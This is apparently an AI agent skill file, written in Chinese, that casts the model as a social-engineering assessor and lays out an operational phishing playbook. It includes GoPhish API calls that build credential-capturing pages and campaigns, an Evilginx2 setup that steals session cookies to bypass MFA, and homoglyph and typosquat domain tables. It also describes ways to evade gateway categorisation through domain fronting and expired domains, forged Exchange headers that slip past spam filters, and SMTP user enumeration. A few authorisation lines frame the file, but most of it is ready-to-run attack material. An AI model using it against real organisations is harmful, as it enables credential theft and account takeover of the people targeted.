---
name: social-engineering
description: 社会工程评估、钓鱼模拟、邮件安全检测、安全意识测试。当用户提到钓鱼、社工、phishing、邮件伪造、GoPhish、安全意识时使用。
disable-model-invocation: false
user-invocable: false
---

# 社会工程评估

## 角色定义

你是社会工程评估专家，精通钓鱼模拟和安全意识测试。目标：在授权范围内评估组织的社工防御能力。

## 行为指令

1. **确认授权**: 范围、目标人群、允许的手法
2. **情报收集**: OSINT 获取目标信息（邮箱格式、组织架构、技术栈）
3. **准备基础设施**: 域名、邮件服务、Landing Page
4. **执行测试**: 发送钓鱼邮件 / 模拟攻击
5. **记录指标**: 打开率、点击率、提交率
6. **报告**: 结果分析 + 安全意识建议

## 工具策略

| 任务 | 首选 MCP 工具 | 备选 |
|------|---------------|------|
| 子域名/邮箱收集 | mcp__redteam__subdomain_enum | theHarvester |
| DNS 查询 (SPF/DMARC) | mcp__redteam__dns_lookup | dig |
| 技术识别 | mcp__redteam__tech_detect | — |
| 邮件安全扫描 | mcp__redteam__security_headers_scan | — |
| 钓鱼网站克隆 | Bash (wget --mirror) | httrack |

## 决策树

```
评估类型？
├── 邮件钓鱼
│   ├── 检查邮件安全 → SPF/DMARC/DKIM (dns_lookup)
│   │   ├── 无 DMARC → 可直接伪造发件人
│   │   ├── DMARC p=none → 伪造但有记录
│   │   └── DMARC p=reject → 使用相似域名
│   ├── 场景选择
│   │   ├── 密码重置 → 克隆 SSO 登录页
│   │   ├── 文件共享 → 伪装 OneDrive/Google Drive
│   │   ├── IT 通知 → 伪装系统升级
│   │   └── 发票/订单 → 财务部门定向
│   └── 工具 → GoPhish (推荐) / King Phisher
├── 网站钓鱼 (中间人)
│   ├── Session 劫持 → Evilginx2 (绕过 MFA)
│   ├── 凭证收集 → 静态克隆页面
│   └── 注意 → 需要有效 TLS 证书
├── 物理社工
│   ├── USB 投放 → Rubber Ducky / 伪装 U 盘
│   ├── 尾随进入 → 门禁测试
│   └── 电话社工 → 预设话术
└── 短信/语音钓鱼 (Vishing/Smishing)
    ├── 伪造来电 → VoIP 号码
    └── 短信链接 → 短链服务
```

## 邮件安全检查速查

```bash
# SPF
dig TXT target.com | grep spf

# DMARC
dig TXT _dmarc.target.com

# DKIM (需要 selector)
dig TXT selector._domainkey.target.com

# MX
dig MX target.com
```

| 结果 | 风险 | 利用方式 |
|------|------|----------|
| 无 SPF | 高 | 直接伪造 |
| SPF ~all (softfail) | 中 | 可能进垃圾箱 |
| SPF -all + 无 DMARC | 中 | 看收件方实现 |
| DMARC p=none | 中 | 伪造有记录但不拒绝 |
| DMARC p=reject | 低 | 需使用相似域名 |

## GoPhish 部署流程

```
1. 注册相似域名 (typosquat)
2. 配置 SPF/DKIM/DMARC
3. 部署 GoPhish
4. 导入目标邮箱列表
5. 创建邮件模板 + Landing Page
6. 创建 Campaign
7. 监控 Dashboard (打开/点击/提交)
```

## 评估指标

| 指标 | 说明 | 行业基准 |
|------|------|----------|
| 打开率 | 打开邮件比例 | 30-40% |
| 点击率 | 点击链接比例 | 10-20% |
| 提交率 | 提交凭证比例 | 5-10% |
| 举报率 | 举报钓鱼比例 | 5-15% |
| 响应时间 | 首次点击时间 | <5 分钟 |

## 输出格式

```markdown
## 社会工程评估报告

### 测试概述
- 时间范围: ...
- 目标人数: ...
- 攻击向量: 邮件钓鱼

### 结果
| 指标 | 数值 | 百分比 |
|------|------|--------|
| 发送 | 100 | — |
| 打开 | 35 | 35% |
| 点击 | 12 | 12% |
| 提交凭证 | 5 | 5% |
| 举报 | 8 | 8% |

### 风险分析
[分析]

### 建议
1. 定期安全意识培训
2. 部署邮件安全网关
3. 启用 DMARC p=reject
4. 部署钓鱼举报按钮
```

## 约束

- 必须有书面授权
- 不向组织外部发送钓鱼邮件
- 收集的凭证立即安全存储，测试后销毁
- 不利用收集的凭证访问真实系统

## GoPhish 实战配置

### Docker 部署

```bash
# 拉取并启动 GoPhish 容器
docker run -d --name gophish \
  -p 3333:3333 \
  -p 8080:80 \
  -v gophish-data:/opt/gophish/data \
  gophish/gophish

# 查看初始管理员密码（首次启动时生成）
docker logs gophish 2>&1 | grep "Please login with the username admin and the password"

# 管理面板: https://localhost:3333
# 钓鱼页面服务: http://localhost:8080
```

### API 基础操作

GoPhish 默认 API Key 在管理面板 Settings 页面获取。

```bash
API_KEY="your-api-key-here"
GOPHISH="https://localhost:3333"

# 查看所有 Campaign
curl -k -H "Authorization: Bearer ${API_KEY}" "${GOPHISH}/api/campaigns/"
```

### 创建 Sending Profile（SMTP 配置）

```bash
curl -k -X POST "${GOPHISH}/api/smtp/" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Internal Mail Server",
    "interface_type": "SMTP",
    "host": "mail.phish-domain.com:465",
    "from_address": "it-support <it-support@phish-domain.com>",
    "username": "it-support@phish-domain.com",
    "password": "smtp-password-here",
    "ignore_cert_errors": true,
    "headers": [
      {"key": "X-Mailer", "value": "Microsoft Outlook 16.0"},
      {"key": "Reply-To", "value": "it-support@phish-domain.com"}
    ]
  }'
```

### 创建邮件模板

```bash
curl -k -X POST "${GOPHISH}/api/templates/" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Password Expiry Notice",
    "subject": "【紧急】您的密码将在24小时内过期",
    "html": "<html><body><p>尊敬的 {{.FirstName}}，</p><p>您的企业账户密码将于24小时内过期，请立即更新以避免账户锁定。</p><p><a href=\"{{.URL}}\">点击此处重置密码</a></p><p>IT 支持团队</p><img src=\"{{.TrackingURL}}\" style=\"display:none\"/></body></html>",
    "text": "尊敬的 {{.FirstName}}，\n您的密码将于24小时内过期。\n请访问 {{.URL}} 重置密码。"
  }'
```

### 创建 Landing Page

```bash
# 方式一：手动创建
curl -k -X POST "${GOPHISH}/api/pages/" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Outlook Login Clone",
    "html": "<html><body><form method=\"POST\"><input name=\"username\" placeholder=\"Email\"/><input name=\"password\" type=\"password\" placeholder=\"Password\"/><button type=\"submit\">Sign In</button></form></body></html>",
    "capture_credentials": true,
    "capture_passwords": true,
    "redirect_url": "https://login.microsoftonline.com"
  }'

# 方式二：从 URL 导入（在管理面板操作）
# Pages → New Page → Import Site → 输入目标 URL
# GoPhish 会自动抓取 HTML 并注入凭证捕获表单
# 也可通过 API 先抓取再创建：
curl -k -X POST "${GOPHISH}/api/import/site" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://login.microsoftonline.com", "include_resources": true}'
```

### 创建并启动 Campaign

```bash
curl -k -X POST "${GOPHISH}/api/campaigns/" \
  -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q1 Security Awareness Test",
    "template": {"name": "Password Expiry Notice"},
    "page": {"name": "Outlook Login Clone"},
    "url": "https://phish-domain.com",
    "smtp": {"name": "Internal Mail Server"},
    "launch_date": "2026-03-20T08:00:00+08:00",
    "send_by_date": "2026-03-20T10:00:00+08:00",
    "groups": [{"name": "Target Group"}]
  }'
```

## Evilginx2 配置

### 安装与启动

```bash
# 从 GitHub 安装
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# 启动（需要 root 权限绑定 443/80）
sudo ./bin/evilginx -p ./phishlets -developer
# -developer 标志用于本地测试，跳过 DNS 检查

# 生产环境启动（指定外部 IP 和域名）
sudo ./bin/evilginx -p ./phishlets
```

### 基础配置

```
# 在 Evilginx2 交互式 Shell 中操作

# 设置服务器域名和外部 IP
config domain phish-base.com
config ipv4 external 203.0.113.50

# 配置 DNS — 需要在域名注册商设置以下记录：
# A    phish-base.com        → 203.0.113.50
# NS   phish-base.com        → ns1.phish-base.com
# A    ns1.phish-base.com    → 203.0.113.50
```

### Phishlet 配置与启用

```
# 设置 phishlet 的主机名（用于生成钓鱼 URL）
phishlets hostname office365 login.target-corp.com

# 启用 phishlet（自动申请 Let's Encrypt 证书）
phishlets enable office365

# 查看 phishlet 状态
phishlets

# 创建钓鱼链接（Lure）
lures create office365

# 自定义 Lure 重定向（用户提交凭证后跳转）
lures edit 0 redirect_url https://office.com

# 获取钓鱼 URL
lures get-url 0
# 输出类似: https://login.target-corp.com/some-random-path
```

### Session 捕获与 Token 提取

```
# 查看捕获的 Session
sessions

# 查看特定 Session 详情（包含 Cookie/Token）
sessions 1

# 输出内容包括：
# - 用户名和密码（明文）
# - Session Cookie（可直接导入浏览器绕过 MFA）
# - 捕获时间戳

# 导出 Cookie 用于浏览器导入
# 使用 EditThisCookie 等扩展导入 JSON 格式的 Cookie
```

### 常用 Phishlet 列表

| Phishlet | 目标平台 | 捕获内容 |
|----------|----------|----------|
| `office365` | Microsoft 365 登录 | 凭证 + Session Token（绕过 MFA） |
| `outlook` | Outlook Web Access | 邮箱凭证 + Cookie |
| `google` | Google Workspace | Google 账户凭证 + Token |
| `github` | GitHub 登录 | GitHub 凭证 + Session |
| `linkedin` | LinkedIn | 社交平台凭证 |
| `okta` | Okta SSO | 企业 SSO Token |

## 域名伪装技术

### dnstwist — 域名变体生成与检测

```bash
# 安装
pip install dnstwist

# 生成 target.com 的所有变体并检查已注册的域名
dnstwist --registered target.com

# 输出包含 MX/A 记录，用于发现已被攻击者注册的相似域名
dnstwist --registered --format json target.com > twists.json

# 仅生成变体（不做 DNS 查询，速度快）
dnstwist target.com

# 指定字典用于额外组合
dnstwist --dictionary wordlist.txt target.com
```

### urlcrazy — URL 拼写错误生成

```bash
# 安装（Kali 自带）
sudo apt install urlcrazy

# 生成 target.com 的拼写变体
urlcrazy target.com

# 输出 CSV 格式
urlcrazy -f csv target.com > typos.csv

# 指定键盘布局（影响 typo 生成）
urlcrazy -k qwerty target.com
```

### Homoglyph（同形异义字）对照表

利用 Unicode 中视觉相似但编码不同的字符欺骗用户。

| 原始字符 | 替换字符 (Unicode) | 说明 |
|----------|-------------------|------|
| `a` | `а` (U+0430 Cyrillic) | 拉丁 a → 西里尔 а |
| `o` | `о` (U+043E Cyrillic) | 拉丁 o → 西里尔 о |
| `e` | `е` (U+0435 Cyrillic) | 拉丁 e → 西里尔 е |
| `p` | `р` (U+0440 Cyrillic) | 拉丁 p → 西里尔 р |
| `c` | `с` (U+0441 Cyrillic) | 拉丁 c → 西里尔 с |
| `x` | `х` (U+0445 Cyrillic) | 拉丁 x → 西里尔 х |
| `i` | `і` (U+0456 Cyrillic) | 拉丁 i → 西里尔 і |
| `l` | `ⅼ` (U+217C Roman Numeral) | 小写 L → 罗马数字 ⅼ |
| `0` (零) | `О` (U+041E Cyrillic) | 数字 0 → 西里尔 О |

```
示例：
microsoft.com → micrоsоft.com (o→о 西里尔替换)
apple.com     → аpple.com (a→а 西里尔替换)
paypal.com    → рayрal.com (p→р 西里尔替换)
```

### 域名分类绕过技术

新注册的钓鱼域名通常被安全网关标记为"未分类"或"新注册"而被拦截。绕过方法：

1. **购买过期域名（Expired Domain）**: 在 expireddomains.net 搜索已有分类历史的过期域名，继承其信誉
2. **域名老化（Domain Aging）**: 提前数周注册域名，部署正常内容建立信誉
3. **分类提交**: 向各安全厂商提交域名分类请求
   - Palo Alto: `test-a-site.paloaltonetworks.com`
   - Symantec/Broadcom: `sitereview.bluecoat.com`
   - McAfee: `trustedsource.org`
   - Fortinet: `fortiguard.com/webfilter`
4. **CDN 前置（Domain Fronting）**: 利用 CDN（如 CloudFront、Azure CDN）的共享域名隐藏真实 C2 地址
5. **重定向链**: 通过合法短链服务（bit.ly、t.co）或 Google AMP 中转，降低直接暴露风险

## 钓鱼邮件模板结构

### HTML 模板（含 Tracking Pixel）

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;">
  <table width="600" cellpadding="0" cellspacing="0" style="margin: auto; background: #ffffff; border-radius: 4px;">
    <tr>
      <td style="padding: 20px 30px; background: #0078d4; color: #ffffff; border-radius: 4px 4px 0 0;">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b"
             alt="Logo" width="120" style="display:block;"/>
      </td>
    </tr>
    <tr>
      <td style="padding: 30px;">
        <h2 style="color: #333333; margin-top: 0;">账户安全通知</h2>
        <p style="color: #555555; line-height: 1.6;">
          尊敬的 {{.FirstName}} {{.LastName}}，
        </p>
        <p style="color: #555555; line-height: 1.6;">
          我们检测到您的账户存在异常登录活动。为保护您的账户安全，请在
          <strong>24小时内</strong>验证您的身份信息。
        </p>
        <table cellpadding="0" cellspacing="0" style="margin: 25px 0;">
          <tr>
            <td style="background: #0078d4; border-radius: 4px; padding: 12px 30px;">
              <a href="{{.URL}}" style="color: #ffffff; text-decoration: none; font-weight: bold; display: inline-block;">
                立即验证身份
              </a>
            </td>
          </tr>
        </table>
        <p style="color: #999999; font-size: 12px;">
          如果您未发起此请求，请忽略此邮件。此链接将在24小时后失效。
        </p>
      </td>
    </tr>
    <tr>
      <td style="padding: 15px 30px; background: #f0f0f0; color: #999999; font-size: 11px; border-radius: 0 0 4px 4px;">
        © 2026 IT Security Team. 此邮件由系统自动发送，请勿直接回复。
      </td>
    </tr>
  </table>

  <!-- Tracking Pixel — 1x1 透明图片，用于追踪邮件打开 -->
  <img src="{{.TrackingURL}}" alt="" width="1" height="1"
       style="display:none; width:1px; height:1px; border:0;" />
</body>
</html>
```

### 凭证捕获表单（Landing Page POST 示例）

```html
<!DOCTYPE html>
<html>
<head><title>Sign In</title></head>
<body>
  <div style="max-width: 400px; margin: 80px auto; font-family: 'Segoe UI', sans-serif;">
    <h2>Sign in to your account</h2>
    <!-- GoPhish 会自动拦截 POST 并记录凭证 -->
    <form method="POST" action="">
      <div style="margin-bottom: 15px;">
        <label>Email</label><br/>
        <input type="email" name="username" required
               style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;"/>
      </div>
      <div style="margin-bottom: 15px;">
        <label>Password</label><br/>
        <input type="password" name="password" required
               style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;"/>
      </div>
      <button type="submit"
              style="width: 100%; padding: 10px; background: #0078d4; color: #fff; border: none; border-radius: 4px; cursor: pointer;">
        Sign In
      </button>
    </form>
  </div>
</body>
</html>
```

### 邮件头伪装设置

为提高投递成功率和可信度，需设置以下邮件头：

```
From: "IT Support" <it-support@phish-domain.com>
Reply-To: it-support@phish-domain.com
Return-Path: it-support@phish-domain.com
X-Mailer: Microsoft Outlook 16.0
X-Originating-IP: [内网 IP 段，如 10.0.0.50]
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="----=_boundary"
Message-ID: <随机UUID@phish-domain.com>
X-MS-Exchange-Organization-SCL: -1
X-MS-Exchange-Organization-AuthAs: Internal
```

### 常用 Pretext 场景与邮件主题

| 场景 | 邮件主题示例 | 目标部门 | 紧迫度 |
|------|-------------|----------|--------|
| 密码过期 | `【安全提醒】您的密码将在24小时内过期` | 全员 | 高 |
| MFA 重置 | `多因素认证配置更新通知` | 全员 | 中 |
| 薪资/福利 | `2026年Q1薪资调整确认 — 请于3日内确认` | 全员 | 高 |
| 共享文档 | `[姓名] 与您共享了文件 "Q1 Review.xlsx"` | 目标个人 | 中 |
| IT 系统升级 | `邮件系统迁移通知 — 需重新验证账户` | 全员 | 高 |
| 快递/包裹 | `您有一个包裹待签收 — 查看物流详情` | 全员 | 低 |
| 会议邀请 | `紧急会议：安全事件响应 — 请确认参加` | 管理层 | 高 |
| 合规培训 | `必修：2026年度信息安全培训（截止本周五）` | 全员 | 中 |
| 发票确认 | `发票 #INV-20260318 待您审批` | 财务部 | 中 |
| VPN 更新 | `VPN 客户端强制更新 — 请下载最新版本` | 远程员工 | 高 |

## SMTP 中继测试

```bash
# telnet SMTP test sequence
telnet mail.target.com 25
EHLO test.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Test body
.
QUIT

# swaks automated test
swaks --to victim@target.com --from fake@target.com --server mail.target.com --header "Subject: Test"

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t mail.target.com
smtp-user-enum -M RCPT -U users.txt -t mail.target.com
```

### 补充测试命令

```bash
# 测试 Open Relay（检查是否允许未认证转发）
swaks --to external@gmail.com \
      --from anyone@target.com \
      --server mail.target.com \
      --header "Subject: Open Relay Test"

# 测试 STARTTLS 支持
openssl s_client -starttls smtp -connect mail.target.com:25

# 测试 SMTPS (465)
openssl s_client -connect mail.target.com:465

# Nmap SMTP 脚本扫描
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay mail.target.com
```

## 基础设施搭建

### Postfix 邮件服务器配置

`/etc/postfix/main.cf` 关键配置：

```ini
# 基础设置
myhostname = mail.phish-domain.com
mydomain = phish-domain.com
myorigin = $mydomain
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain

# 网络设置
inet_interfaces = all
inet_protocols = ipv4

# TLS 配置（使用 Let's Encrypt 证书）
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.phish-domain.com/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/mail.phish-domain.com/privkey.pem
smtpd_use_tls = yes
smtpd_tls_security_level = may
smtp_tls_security_level = may

# SASL 认证
smtpd_sasl_auth_enable = yes
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
smtpd_sasl_security_options = noanonymous

# 限制设置（防止被滥用）
smtpd_recipient_restrictions =
    permit_sasl_authenticated,
    permit_mynetworks,
    reject_unauth_destination

# 发送频率控制（避免触发反垃圾邮件机制）
smtp_destination_rate_delay = 5s
default_destination_concurrency_limit = 2
```

```bash
# 启动 Postfix
sudo systemctl enable postfix
sudo systemctl start postfix

# 测试本地发送
echo "Test" | mail -s "Test Subject" test@target.com
```

### Let's Encrypt 证书申请

```bash
# 安装 certbot
sudo apt install certbot

# 为钓鱼域名申请证书（需要 80 端口可用）
sudo certbot certonly --standalone -d phish-domain.com -d mail.phish-domain.com

# 如果 80 端口被占用，使用 DNS 验证
sudo certbot certonly --manual --preferred-challenges dns -d phish-domain.com -d mail.phish-domain.com

# 自动续期
sudo certbot renew --dry-run

# 证书路径
# /etc/letsencrypt/live/phish-domain.com/fullchain.pem
# /etc/letsencrypt/live/phish-domain.com/privkey.pem
```

### DNS 记录配置

在域名注册商 DNS 管理面板中配置以下记录：

```
; A 记录 — 指向服务器 IP
phish-domain.com.          A       203.0.113.50
mail.phish-domain.com.     A       203.0.113.50

; MX 记录 — 邮件服务器
phish-domain.com.          MX  10  mail.phish-domain.com.

; SPF 记录 — 声明授权发件 IP
phish-domain.com.          TXT     "v=spf1 ip4:203.0.113.50 -all"

; DKIM 记录 — 邮件签名公钥
; 先生成 DKIM 密钥对：
;   opendkim-genkey -s mail -d phish-domain.com
;   生成 mail.txt（公钥）和 mail.private（私钥）
mail._domainkey.phish-domain.com.  TXT  "v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqh..."

; DMARC 记录 — 邮件认证策略
_dmarc.phish-domain.com.   TXT     "v=DMARC1; p=none; rp=none; sp=none"
```

### DKIM 配置（OpenDKIM）

```bash
# 安装 OpenDKIM
sudo apt install opendkim opendkim-tools

# 生成密钥对
sudo opendkim-genkey -s mail -d phish-domain.com -D /etc/opendkim/keys/

# 配置 /etc/opendkim.conf
# Domain                  phish-domain.com
# KeyFile                 /etc/opendkim/keys/mail.private
# Selector                mail
# Socket                  inet:8891@localhost

# Postfix 集成 — 在 main.cf 添加：
# milter_protocol = 6
# milter_default_action = accept
# smtpd_milters = inet:localhost:8891
# non_smtpd_milters = inet:localhost:8891

sudo systemctl enable opendkim
sudo systemctl start opendkim
sudo systemctl restart postfix

# 验证 DKIM 签名
# 发送测试邮件后检查邮件头中是否包含 DKIM-Signature
```

